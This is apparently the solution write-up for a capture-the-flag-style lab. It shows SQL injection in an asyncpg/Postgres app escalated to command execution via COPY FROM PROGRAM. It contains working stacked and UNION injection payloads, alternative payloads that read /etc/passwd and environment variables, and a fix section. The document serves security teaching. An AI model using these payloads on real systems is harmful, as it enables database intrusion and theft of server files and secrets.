# Solution — sqli-postgres-copy-program-rce-chain

> **OWASP:** A03:2021-Injection · **CWE:** CWE-89 (SQLi) → CWE-78 (OS command
> injection) · **CVE analog:** Postgres `COPY FROM PROGRAM` superuser RCE
> (e.g. GitLab HackerOne #827052) — abstracted; no vendor code reproduced.

## What tipped you off

`GET /metrics?category=web` returns rows and echoes SQL error text when you inject
a quote — a textbook **visible** injection. But the real prize needs two things a
single visible SELECT cannot give you: **stacked statements** (to `CREATE TABLE`
and `COPY`) and a **superuser** (to use `COPY ... FROM PROGRAM`).

## The class of bug

SQL injection (CWE-89) escalating to command execution (CWE-78) because the app
connects as a **database superuser**. `src/app.py` builds two queries by
concatenation:

```python
# VISIBLE sink — asyncpg .fetch() => extended (prepared) protocol => ONE statement
"SELECT id, name, value FROM metrics WHERE category = '" + category + "' ORDER BY id"

# STACKED-CAPABLE sink — asyncpg .execute() => simple query protocol => many ';' statements
"INSERT INTO events (source, category) VALUES ('" + source + "', '" + category + "')"
```

The protocol difference is the crux: asyncpg's `.fetch()`/`.fetchrow()` use the
**extended** query protocol, which permits exactly one statement (try to stack and
you get `cannot insert multiple commands into a prepared statement`). `.execute()`
uses the **simple** query protocol, which happily runs several `;`-separated
statements. So the visible endpoint is for reading (UNION), and the ingest
endpoint is the one that lets you run stacked DDL + `COPY`.

## Why a superuser is the whole game

`COPY ... FROM PROGRAM 'cmd'` and `COPY ... TO 'file'` are **superuser-only** (or
require the `pg_execute_server_program` / `pg_write_server_files` roles). An app
that connects as the `POSTGRES_USER` role inherits superuser, so the injection
inherits it too. `SELECT current_user, usesuper` returns `t`.

## Building the exploit

**Step 1 — run the command (stacked, through the ingest sink).** Inject `source`:

```
x', 'web'); DROP TABLE IF EXISTS loot; CREATE TABLE loot(o text);
COPY loot FROM PROGRAM 'cat /labflag/flag.txt'; --
```

which assembles (the trailing `'), 'web')` is commented out by `--`):

```sql
INSERT INTO events (source, category) VALUES ('x', 'web');
DROP TABLE IF EXISTS loot; CREATE TABLE loot(o text);
COPY loot FROM PROGRAM 'cat /labflag/flag.txt'; --', 'web')
```

`COPY loot FROM PROGRAM 'cat /labflag/flag.txt'` runs `cat` as the postgres OS
user and loads the flag into `loot`.

**Step 2 — read the output (UNION, through the visible sink).**

```
GET /metrics?category=' UNION SELECT 1, o, 1 FROM loot --
```

→ `SELECT id, name, value FROM metrics WHERE category = '' UNION SELECT 1, o, 1
FROM loot --' ORDER BY id`, and the flag comes back as the `name` field of the
UNION row.

**Step 3 — submit.** `POST /solve {"flag":"FLAG{...}"}` returns the flag plus a
signed completion token.

`tests/exploit.py` does exactly this (stdlib only) and finishes in well under a
second — the whole cost is two HTTP requests.

## Why the flag isn't just SELECT-able

The flag is planted on the **Postgres container's filesystem** (`/labflag/flag.txt`)
by the app at startup via a superuser `COPY (SELECT '<flag>') TO '<path>'`
server-side write — see `src/seed.py`. It is never inserted into a table, so no
amount of ordinary SQL reads it: you must execute a command. Real `COPY FROM
PROGRAM` engagements read `/etc/passwd`, spawn reverse shells, etc.; here the
target file is the flag.

## Lab-vs-production deviations

- **`risk: low`, not `risk: elevated`.** An RCE lab sounds like it should need a
  relaxed sandbox, but it does not: `COPY FROM PROGRAM` forks a command as the
  unprivileged postgres uid and needs **no added Linux capabilities**. The
  container keeps `cap_drop: ALL`, read-only rootfs, `no-new-privileges`, and
  pids/memory caps, and the Postgres service sits alone on an `internal: true`
  (no-egress) network so a shell cannot phone home or pivot. Elevated privilege
  that is not strictly required would be a worse, not better, lab.
- **Two injectable sinks instead of one.** The catalogue sketched a single filter
  param. Because asyncpg's prepared-statement path (`.fetch`) rejects stacked
  statements, the lab exposes a visible read sink (`.fetch`) and a stacked-capable
  write sink (`.execute`). Splitting them is faithful to how asyncpg actually
  behaves and teaches the simple-vs-extended protocol distinction.
- **Flag planted via `COPY TO`, derived app-side.** The flag is derived in the app
  container from `LAB_USER_SECRET` and written into the Postgres filesystem with a
  superuser `COPY TO`. The raw secret is **never** sent to Postgres, so a shell
  obtained via the RCE can read _this_ instance's flag (the objective) but cannot
  re-derive other learners' flags. The flag path is `/labflag/flag.txt` (a tmpfs)
  rather than `/flag.txt` because the root filesystem is read-only.
- **Completion token** is a minimal stdlib HS256 JWT (an opaque "solved" receipt),
  not a platform-integrated credential.

## Alternative payload vectors

1. **Read any file**: `COPY loot FROM PROGRAM 'cat /etc/passwd'` (or `id`, `env`,
   `ls -la /`) — the same primitive, any command.
2. **`lo_import` / `pg_read_file`** read server files without `PROGRAM`, but only
   files (no command execution) — enough to confirm superuser file read.
3. **Single-table readback**: `COPY metrics(name) FROM PROGRAM 'cat
/labflag/flag.txt'` appends the output straight into the existing `metrics`
   table, then the plain `GET /metrics` shows it — no separate `loot` table.

## Fix

- **Never connect the app as a superuser.** Create a least-privilege role with only
  the tables it needs; `COPY FROM PROGRAM` then fails with a permissions error.
- **Parameterise.** Use asyncpg placeholders (`$1`) instead of string
  concatenation on both endpoints; bound parameters cannot introduce new SQL.
- **Defence in depth**: keep `cap_drop: ALL` and a no-egress network so that even a
  successful RCE is inert.
